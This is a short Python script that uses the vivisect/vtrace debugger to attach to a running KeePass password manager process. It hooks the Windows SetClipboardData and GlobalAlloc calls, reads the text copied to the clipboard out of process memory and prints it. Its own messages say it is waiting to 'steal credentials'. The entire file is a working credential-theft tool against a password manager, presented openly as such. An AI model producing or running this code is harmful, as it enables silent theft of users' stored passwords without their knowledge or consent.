import platform
import sys
import re
import struct

vdb_path = "C:\\Reversing\\vivisect"
sys.path.insert(1,vdb_path)

import vtrace
import vdb
from envi.archs import i386 as arch

trace = None
AllocSize = 0

def allochook(event, trace, ret_addr, args, callconv):
    global hClipboardData
    global AllocSize
        
    if args[0] == 2: #GMEM MOVEABLE
        AllocSize = int(args[1])
    else:
        return

    return

def cliphook(event, trace, ret_addr, args, callconv):
    if args[0] == 1: #CF_TEXT clipboardtype
        clip_addr = trace.getRegister(arch.REG_ESP) + 0x1C
        clip_struct = trace.readMemory(clip_addr,4)
        sAddress = struct.unpack("L", clip_struct)[0]
        clip_string = trace.readMemory(sAddress,AllocSize)
        clip_string = clip_string.split("\x00")[0] #Couldn't find a function to read a string and Allocsize isn't the length
        print "[*] Cliphook cred: %s" % clip_string
        return


def find_pid_by_name(pname):
    processes = trace.ps()
    for entry in processes:
        (pid, name) = entry
        if name == pname:
            return pid
        
    return None

def attach(pid, base=None):

    if pid != None:
        trace.attach(pid)

    bp = vtrace.breakpoints.HookBreakpoint('user32.SetClipboardData')
    bp.addPreHook(cliphook)
    bpid = trace.addBreakpoint(bp)
    bp2 = vtrace.breakpoints.HookBreakpoint('kernel32.GlobalAlloc')
    bp2.addPreHook(allochook)
    trace.addBreakpoint(bp2)

    print "[*] Waiting for clipboard operations to steal credentials...."

    trace.setMode('RunForever', True) 
    trace.run()


def main(argv):
    global trace

    trace = vtrace.getTrace()
    #vtrace.platforms.win32.getDebugPrivileges()
    if len(argv) != 2:
        print "Usage: %s <KeePass.exe>" % sys.argv[0]
        sys.exit(1)

    pid = find_pid_by_name(sys.argv[1])
    if pid:
        print "Found PID: %i" % pid
    else:
        print "Program not running"
        sys.exit(1)
    attach(pid)

if __name__ == "__main__":
    main(sys.argv)
    sys.exit(0)
